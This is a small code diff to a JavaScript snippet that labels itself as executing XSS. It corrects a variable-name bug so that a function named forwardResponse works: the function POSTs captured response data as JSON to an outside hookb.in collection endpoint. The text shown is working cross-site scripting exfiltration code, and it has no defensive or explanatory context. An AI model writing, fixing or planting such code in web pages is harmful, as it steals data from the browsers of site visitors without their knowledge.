@@ -3,13 +3,13 @@ const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";
 
 function forwardResponse(res) {
 	let fwdxhr = new XMLHttpRequest();
-	xhr.open("POST", ENDPOINT, true);
-	xhr.setRequestHeader("Content-Type", "application/json");
-	xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
+	fwdxhr.open("POST", ENDPOINT, true);
+	fwdxhr.setRequestHeader("Content-Type", "application/json");
+	fwdxhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
 	const data = JSON.stringify({
 		"data": res,
 	});
-	xhr.send(data)
+	fwdxhr.send(data)
 }
 
 console.log('executing XSS');
